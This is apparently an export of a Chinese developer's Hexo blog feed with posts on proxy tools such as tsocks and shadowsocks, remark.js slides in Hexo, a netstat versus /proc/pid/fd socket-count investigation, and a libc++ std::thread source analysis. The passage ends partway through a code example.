<h3 id="linux下不支持代理的程序使用socks代理：tsocks"><a href="#linux下不支持代理的程序使用socks代理：tsocks" class="headerlink" title="linux下不支持代理的程序使用socks代理：tsocks"></a>linux下不支持代理的程序使用socks代理：tsocks</h3><p>tsocks利用LD_PRELOAD机制，代理程序里的connect函数，然后就可以代理所有的TCP请求了。<br>不过dns请求，默认是通过udp来发送的，所以tsocks不能代理dns请求。</p>
<p>默认情况下，tsocks会先加载~/.tsocks.conf，如果没有，再加载/etc/tsocks.conf。对于local ip不会代理。</p>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install tsocks</span><br><span class="line">LD_PRELOAD=/usr/lib/libtsocks.so wget http://www.facebook.com</span><br></pre></td></tr></table></figure>
<h2 id="基于路由器的方案"><a href="#基于路由器的方案" class="headerlink" title="基于路由器的方案"></a>基于路由器的方案</h2><p>基于路由器的方案有很多，原理和本机的方案是一样的，只不过把这些措施前移到路由器里。</p>
<p>路由器的方案的优点是很明显的：</p>
<ul>
<li>手机/平板不用设置</li>
<li>公司/局域网级的代理</li>
</ul>
<p>但是需要专门的路由器，刷固件等。</p>
<p>shadowsocks, shadowvpn都可以跑在路由器上。</p>
<p>一些项目收集：</p>
<p><a href="https://github.com/lifetyper/FreeRouter_V2" target="_blank" rel="noopener">https://github.com/lifetyper/FreeRouter_V2</a></p>
<p><a href="https://gist.github.com/wen-long/8644243" target="_blank" rel="noopener">https://gist.github.com/wen-long/8644243</a></p>
<p><a href="https://github.com/ashi009/bestroutetb" target="_blank" rel="noopener">https://github.com/ashi009/bestroutetb</a></p>
<h2 id="推荐的办法"><a href="#推荐的办法" class="headerlink" title="推荐的办法"></a>推荐的办法</h2><p>完全免费</p>
<ul>
<li>chrome + switchsharp/SwitchyOmega + http proxy</li>
<li>goagent</li>
</ul>
<p>程序员的推荐</p>
<ul>
<li>chrome + switchsharp/SwitchyOmega + socks5 proxy</li>
<li>aws免费一年的服务器/其它国外免费云主机，节点位置决定速度，推荐东京机房</li>
<li>shadowsocks</li>
</ul>
<p>第三方免费的服务器</p>
<ul>
<li>shadowsocks服务器，微信公众号：pennyjob</li>
</ul>
<p>手机软件：</p>
<ul>
<li>fqrouter</li>
<li>shadowsocks client</li>
</ul>
<p>商业软件安全性自己考虑</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>新技术层出不穷</li>
<li>越流行，越容易失效</li>
<li>实现一个proxy其实相当简单</li>
<li>知其所以然，更好使用工具，也可以创作出自己的工具。</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>在hexo里配置remarkjs</title>
    <url>/hexo-support-remarkjs/</url>
    <content><![CDATA[<p>remarkjs是一个比较流行的用md格式写slides的库 ：<a href="https://github.com/gnab/remark" target="_blank" rel="noopener">https://github.com/gnab/remark</a></p>
<p>打算在hexo里增加对remark的支持。但是hexo会把所以的source目录下的md后缀的文件全部转换为html。<br>这样就很蛋疼了。</p>
<p>研究了下，发现hexo支持html, xml等在文件最前面加上layout: false就不会转换加上hexo模板的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">layout: false</span><br><span class="line">--------</span><br></pre></td></tr></table></figure>
<p>但是这个配置对于md后缀的文件不起效。</p>
<p>所以只能修改md后缀为其它后缀了。</p>
<ul>
<li>在source目录下创建一个slides的目录；</li>
<li><p>新建test.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">layout: false</span><br><span class="line">--------</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;/&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">      @import url(http://fonts.googleapis.com/css?family=Yanone+Kaffeesatz);</span><br><span class="line">      @import url(http://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic);</span><br><span class="line">      @import url(http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700,400italic);</span><br><span class="line"></span><br><span class="line">      body &#123; font-family: &apos;Droid Serif&apos;; &#125;</span><br><span class="line">      h1, h2, h3 &#123;</span><br><span class="line">        font-family: &apos;Yanone Kaffeesatz&apos;;</span><br><span class="line">        font-weight: normal;</span><br><span class="line">      &#125;</span><br><span class="line">      .remark-code, .remark-inline-code &#123; font-family: &apos;Ubuntu Mono&apos;; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script src=&quot;http://gnab.github.io/remark/downloads/remark-latest.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      var slideshow = remark.create(&#123;</span><br><span class="line">    sourceUrl: &apos;/slides/test.mymd&apos;</span><br><span class="line">      &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>新建test.mymd文件，里面是slide的内容：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class: center, middle</span><br><span class="line"></span><br><span class="line"><span class="section"># Hello World</span></span><br><span class="line"></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新deploy，<code>hexo deploy</code></p>
</li>
<li>在浏览器里访问，<a href="http://localhost:4000/slides/test.html" target="_blank" rel="noopener">http://localhost:4000/slides/test.html</a><br>本站的测试例子：<a href="http://hengyunabc.github.io/slides/test.html">http://hengyunabc.github.io/slides/test.html</a></li>
</ul>
<p>hexo其实最好能提供一个exclude的配置，允许某些目录不处理。在github上提了一个issue：<a href="https://github.com/hexojs/hexo/issues/991" target="_blank" rel="noopener">https://github.com/hexojs/hexo/issues/991</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>remarkjs</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>netstat统计的tcp连接数与⁄proc⁄pid⁄fd下socket类型fd数量不一致的分析</title>
    <url>/netstat-difference-proc-fd-socket-stat/</url>
    <content><![CDATA[<p>最近，线上一个应用，发现socket数缓慢增长，并且不回收，超过警告线之后，被运维监控自动重启了。</p>
<p>首先到zabbix上观察JVM历史记录，发现JVM-Perm space最近两周没有数据，猜测是程序从JDK7切换到JDK8了。问过开发人员之后，程序已经很久没有重启了，最近才重新发布的。而在这期间，线上的Java运行环境已经从JDK7升级到JDK8了。</p>
<p>因为jdk8里没有Perm space了，换成了Metaspace。</p>
<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>到线上服务器上，用netstat来统计进程的connection数量。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -antp | grep pid | wc -l</span><br></pre></td></tr></table></figure></p>
<p>发现比zabbix上的统计socket数量要少100多，netstat统计只有100多，而zabbix上监控数据有300多。</p>
<p>于是到/proc/$pid/fd下统计socket类型的fd数量：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /proc/<span class="variable">$pid</span>/fd</span><br><span class="line">ls -al | grep socket | wc -l</span><br></pre></td></tr></table></figure></p>
<p>发现数据和zabbix上的数据一致。</p>
<h3 id="netstat是怎么统计的"><a href="#netstat是怎么统计的" class="headerlink" title="netstat是怎么统计的"></a>netstat是怎么统计的</h3><h4 id="下载netstat的源代码"><a href="#下载netstat的源代码" class="headerlink" title="下载netstat的源代码"></a>下载netstat的源代码</h4><p><a href="http://unix.stackexchange.com/questions/21503/source-code-of-netstat" target="_blank" rel="noopener">http://unix.stackexchange.com/questions/21503/source-code-of-netstat</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get <span class="built_in">source</span> net-tools</span><br></pre></td></tr></table></figure></p>
<p>从netstat的代码里，大概可以看到是读取/proc/net/tcp里面的数据来获取统计信息的。</p>
<h4 id="java和c版的简单netstat的实现"><a href="#java和c版的简单netstat的实现" class="headerlink" title="java和c版的简单netstat的实现"></a>java和c版的简单netstat的实现</h4><p>java版的</p>
<p><a href="http://www.cs.earlham.edu/~jeremiah/LinuxSocket.java" target="_blank" rel="noopener">http://www.cs.earlham.edu/~jeremiah/LinuxSocket.java</a></p>
<p>C版的：</p>
<p><a href="http://www.netmite.com/android/mydroid/system/core/toolbox/netstat.c" target="_blank" rel="noopener">http://www.netmite.com/android/mydroid/system/core/toolbox/netstat.c</a></p>
<h4 id="用starce跟踪netstat"><a href="#用starce跟踪netstat" class="headerlink" title="用starce跟踪netstat"></a>用starce跟踪netstat</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strace netstat -antp</span><br></pre></td></tr></table></figure>
<p>可以发现netstat把/proc 下的很多数据都读取出来了。于是大致可以知道netstat是把/proc/pid/fd 下面的数据和/proc/net/下面的数据汇总，对照得到统计结果的。</p>
<h4 id="哪些socket会没有被netstat统计到？"><a href="#哪些socket会没有被netstat统计到？" class="headerlink" title="哪些socket会没有被netstat统计到？"></a>哪些socket会没有被netstat统计到？</h4><p>又在网上找了下，发现这里有说到socket如果创建了，没有bind或者connect，就不会被netstat统计到。</p>
<p><a href="http://serverfault.com/questions/153983/sockets-found-by-lsof-but-not-by-netstat" target="_blank" rel="noopener">http://serverfault.com/questions/153983/sockets-found-by-lsof-but-not-by-netstat</a></p>
<p>实际上，也就是如果socket创建了，没有被使用，那么就只会在/proc/pid/fd下面有，而不会在/proc/net/下面有相关数据。</p>
<p>简单测试了下，的确是这样：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> socket = socket(PF_INET,SOCK_STREAM,<span class="number">0</span>); <span class="comment">//不使用</span></span><br></pre></td></tr></table></figure></p>
<p>另外，即使socket是使用过的，如果执行shutdown后，刚开始里，用netstat可以统计到socket的状态是FIN_WAIT1。过一段时间，netstat统计不到socket的信息的，但是在<code>/proc/pid/fd</code>下，还是可以找到。</p>
<p>中间的时候，自己写了个程序，把/proc/pid/fd 下的inode和/proc/net/下面的数据比较，发现的确有些socket的inode不会出现在/proc/net/下。</p>
<h4 id="用lsof查看"><a href="#用lsof查看" class="headerlink" title="用lsof查看"></a>用lsof查看</h4><p>用lsof查看socket inode：</p>
<h3 id="触发GC，回收socket"><a href="#触发GC，回收socket" class="headerlink" title="触发GC，回收socket"></a>触发GC，回收socket</h3><p>于是尝试触发GC，看下socket会不会被回收：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jmap -histo:live &lt;pid&gt;</span><br></pre></td></tr></table></figure></p>
<p>结果，发现socket都被回收了。</p>
<p>再看下AbstractPlainSocketImpl的finalize方法：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Cleans up if the user forgets to close it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到socket是会在GC时，被close掉的。<br>写个程序来测试下：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServer</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)&#123;</span><br><span class="line">			ServerSocket socket = <span class="keyword">new</span> ServerSocket(i + <span class="number">10000</span>);</span><br><span class="line">			System.err.println(socket);</span><br><span class="line">		&#125;</span><br><span class="line">		System.in.read();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先执行，查看/proc/pid/fd，可以发现有相关的socket fd，再触发GC，可以发现socket被回收掉了。</p>
<h2 id="其它的东东"><a href="#其它的东东" class="headerlink" title="其它的东东"></a>其它的东东</h2><h4 id="anon-inode-eventpoll"><a href="#anon-inode-eventpoll" class="headerlink" title="anon_inode:[eventpoll]"></a>anon_inode:[eventpoll]</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -al /proc/pid/fd</span><br></pre></td></tr></table></figure>
<p>可以看到有像这样的输出：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">661 -&gt; anon_inode:[eventpoll]</span><br></pre></td></tr></table></figure></p>
<p>这种类型的inode，是epoll创建的。</p>
<p>再扯远一点，linux下java里的selector实现是epoll结合一个pipe来实现事件通知功能的。所以在NIO程序里，会有anon_inode:[eventpoll]和pipe类型的fd。</p>
<h4 id="为什么tail-f-proc-pid-fd-1-不能读取到stdout的数据"><a href="#为什么tail-f-proc-pid-fd-1-不能读取到stdout的数据" class="headerlink" title="为什么tail -f /proc/$pid/fd/1 不能读取到stdout的数据"></a>为什么tail -f /proc/$pid/fd/1 不能读取到stdout的数据</h4><p><a href="http://unix.stackexchange.com/questions/152773/why-cant-i-tail-f-proc-pid-fd-1" target="_blank" rel="noopener">http://unix.stackexchange.com/questions/152773/why-cant-i-tail-f-proc-pid-fd-1</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>原因是jdk升级之后，GC的工作方式有变化，FullGC执行的时间变长了，导致有些空闲的socket没有被回收。</p>
<p>本文比较乱，记录下一些工具和技巧。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>jvm</tag>
        <tag>netstat</tag>
        <tag>gc</tag>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">trobuleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>C++11的thread代码分析</title>
    <url>/cpp11-thread/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文分析的是llvm libc++的实现：<a href="http://libcxx.llvm.org/" target="_blank" rel="noopener">http://libcxx.llvm.org/</a></p>
<h2 id="class-thread"><a href="#class-thread" class="headerlink" title="class thread"></a>class thread</h2><p>thread类直接包装了一个pthread_t，在linux下实际是unsigned long int。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">thread</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> __t_;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    <span class="function">id <span class="title">get_id</span><span class="params">()</span> <span class="keyword">const</span> _NOEXCEPT </span>&#123;<span class="keyword">return</span> __t_;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用了一个std::unique_ptr来包装用户定义的线程函数：</p>
<p>创建线程用的是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Fp</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span>*</span></span><br><span class="line"><span class="class">__<span class="title">thread_proxy</span>(<span class="title">void</span>* __<span class="title">vp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __thread_local_data().reset(<span class="keyword">new</span> __thread_struct);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;_Fp&gt; __p(<span class="keyword">static_cast</span>&lt;_Fp*&gt;(__vp));</span><br><span class="line">    (*__p)();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Fp</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">thread</span>:</span>:thread(_Fp __f)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;_Fp&gt; __p(<span class="keyword">new</span> _Fp(__f));</span><br><span class="line">    <span class="keyword">int</span> __ec = pthread_create(&amp;__t_, <span class="number">0</span>, &amp;__thread_proxy&lt;_Fp&gt;, __p.get());</span><br><span class="line">    <span class="keyword">if</span> (__ec == <span class="number">0</span>)</span><br><span class="line">        __p.release();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        __throw_system_error(__ec, <span class="string">"thread constructor failed"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="thread-joinable-thread-join-thread-detach"><a href="#thread-joinable-thread-join-thread-detach" class="headerlink" title="thread::joinable() , thread::join(), thread::detach()"></a>thread::joinable() , thread::join(), thread::detach()</h2><p>再来看下thread::joinable() , thread::join(), thread::detach() 函数。<br>也是相应调用了posix的函数。在调用join()之后，会把_t设置为0，这样再调用joinable()时就会返回false。<strong>对于_t变量没有memory barrier同步，感觉可能会有问题。</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">joinable</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;<span class="keyword">return</span> __t_ != <span class="number">0</span>;&#125;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">thread::join()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ec = pthread_join(__t_, <span class="number">0</span>);</span><br><span class="line">    __t_ = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">thread::detach()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ec = EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (__t_ != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ec = pthread_detach(__t_);</span><br><span class="line">        <span class="keyword">if</span> (ec == <span class="number">0</span>)</span><br><span class="line">            __t_ = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ec)</span><br><span class="line">        <span class="keyword">throw</span> system_error(error_code(ec, system_category()), <span class="string">"thread::detach failed"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="thread-hardware-concurrency"><a href="#thread-hardware-concurrency" class="headerlink" title="thread::hardware_concurrency()"></a>thread::hardware_concurrency()</h2><p>thread::hardware_concurrency()函数，获取的是当前可用的processor的数量。<br>调用的是sysconf(_SC_NPROCESSORS_ONLN)函数，据man手册：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- _SC_NPROCESSORS_ONLN</span><br><span class="line">      The number of processors currently online (available).</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span></span><br><span class="line">thread::hardware_concurrency() _NOEXCEPT</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">long</span> result = sysconf(_SC_NPROCESSORS_ONLN);</span><br><span class="line">    <span class="comment">// sysconf returns -1 if the name is invalid, the option does not exist or</span></span><br><span class="line">    <span class="comment">// does not have a definite limit.</span></span><br><span class="line">    <span class="comment">// if sysconf returns some other negative number, we have no idea</span></span><br><span class="line">    <span class="comment">// what is going on. Default to something safe.</span></span><br><span class="line">    <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span>&gt;(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="thread-sleep-for和thread-sleep-until"><a href="#thread-sleep-for和thread-sleep-until" class="headerlink" title="thread::sleep_for和thread::sleep_until"></a>thread::sleep_for和thread::sleep_until</h2><p>sleep_for函数实际调用的是nanosleep函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">sleep_for(<span class="keyword">const</span> chrono::nanoseconds&amp; ns)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> chrono;</span><br><span class="line">    <span class="keyword">if</span> (ns &gt; nanoseconds::zero())</span><br><span class="line">    &#123;</span><br><span class="line">        seconds s = duration_cast&lt;seconds&gt;(ns);</span><br><span class="line">        timespec ts;</span><br><span class="line">        <span class="function"><span class="keyword">typedef</span> <span class="title">decltype</span><span class="params">(ts.tv_sec)</span> ts_sec</span>;</span><br><span class="line">        _LIBCPP_CONSTEXPR ts_sec ts_sec_max = numeric_limits&lt;ts_sec&gt;::max();</span><br><span class="line">        <span class="keyword">if</span> (s.count() &lt; ts_sec_max)</span><br><span class="line">        &#123;</span><br><span class="line">            ts.tv_sec = <span class="keyword">static_cast</span>&lt;ts_sec&gt;(s.count());</span><br><span class="line">            ts.tv_nsec = <span class="keyword">static_cast</span>&lt;<span class="keyword">decltype</span>(ts.tv_nsec)&gt;((ns-s).count());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ts.tv_sec = ts_sec_max;</span><br><span class="line">            ts.tv_nsec = giga::num - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> (nanosleep(&amp;ts, &amp;ts) == <span class="number">-1</span> &amp;&amp; errno == EINTR)</span><br><span class="line">            ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sleep_until函数用到了mutex, condition_variable, unique_lock，实际上调用的还是pthread_cond_timedwait函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span></span></span><br><span class="line"><span class="class"><span class="title">sleep_until</span>(<span class="title">const</span> <span class="title">chrono</span>:</span>:time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> chrono;</span><br><span class="line">    mutex __mut;</span><br><span class="line">    condition_variable __cv;</span><br><span class="line">    unique_lock&lt;mutex&gt; __lk(__mut);</span><br><span class="line">    <span class="keyword">while</span> (_Clock::now() &lt; <span class="keyword">__t</span>)</span><br><span class="line">        __cv.wait_until(__lk, <span class="keyword">__t</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">condition_variable::__do_timed_wait(unique_lock&lt;mutex&gt;&amp; lk,</span><br><span class="line">     chrono::time_point&lt;chrono::system_clock, chrono::nanoseconds&gt; tp) _NOEXCEPT</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> chrono;</span><br><span class="line">    <span class="keyword">if</span> (!lk.owns_lock())</span><br><span class="line">        __throw_system_error(EPERM,</span><br><span class="line">                            <span class="string">"condition_variable::timed wait: mutex not locked"</span>);</span><br><span class="line">    nanoseconds d = tp.time_since_epoch();</span><br><span class="line">    <span class="keyword">if</span> (d &gt; nanoseconds(<span class="number">0x59682F000000E941</span>))</span><br><span class="line">        d = nanoseconds(<span class="number">0x59682F000000E941</span>);</span><br><span class="line">    timespec ts;</span><br><span class="line">    seconds s = duration_cast&lt;seconds&gt;(d);</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">decltype</span><span class="params">(ts.tv_sec)</span> ts_sec</span>;</span><br><span class="line">    _LIBCPP_CONSTEXPR ts_sec ts_sec_max = numeric_limits&lt;ts_sec&gt;::max();</span><br><span class="line">    <span class="keyword">if</span> (s.count() &lt; ts_sec_max)</span><br><span class="line">    &#123;</span><br><span class="line">        ts.tv_sec = <span class="keyword">static_cast</span>&lt;ts_sec&gt;(s.count());</span><br><span class="line">        ts.tv_nsec = <span class="keyword">static_cast</span>&lt;<span class="keyword">decltype</span>(ts.tv_nsec)&gt;((d - s).count());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ts.tv_sec = ts_sec_max;</span><br><span class="line">        ts.tv_nsec = giga::num - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ec = pthread_cond_timedwait(&amp;__cv_, lk.mutex()-&gt;native_handle(), &amp;ts);</span><br><span class="line">    <span class="keyword">if</span> (ec != <span class="number">0</span> &amp;&amp; ec != ETIMEDOUT)</span><br><span class="line">        __throw_system_error(ec, <span class="string">"condition_variable timed_wait failed"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="std-notify-all-at-thread-exit-的实现"><a href="#std-notify-all-at-thread-exit-的实现" class="headerlink" title="std::notify_all_at_thread_exit 的实现"></a>std::notify_all_at_thread_exit 的实现</h2><p>先来看个例子，这个notify_all_at_thread_exit函数到底有什么用：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;condtion_variable&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">std</span>::mutex m;</span><br><span class="line"><span class="built_in">std</span>::condition_variable cv;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">bool</span> ready = <span class="literal">false</span>;</span><br><span class="line">ComplexType result;  <span class="comment">// some arbitrary type</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::unique_lock&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lk</span><span class="params">(m)</span></span>;</span><br><span class="line">    <span class="comment">// assign a value to result using thread_local data</span></span><br><span class="line">    result = function_that_uses_thread_locals();</span><br><span class="line">    ready = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">std</span>::notify_all_at_thread_exit(cv, <span class="built_in">std</span>::move(lk));</span><br><span class="line">&#125; <span class="comment">// 1. destroy thread_locals, 2. unlock mutex, 3. notify cv</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t</span><span class="params">(thread_func)</span></span>;</span><br><span class="line">    t.detach();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// do other work</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// wait for the detached thread</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::unique_lock&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lk</span><span class="params">(m)</span></span>;</span><br><span class="line">    <span class="keyword">while</span>(!ready) &#123;</span><br><span class="line">        cv.wait(lk);</span><br><span class="line">    &#125;</span><br><span class="line">    process(result); <span class="comment">// result is ready 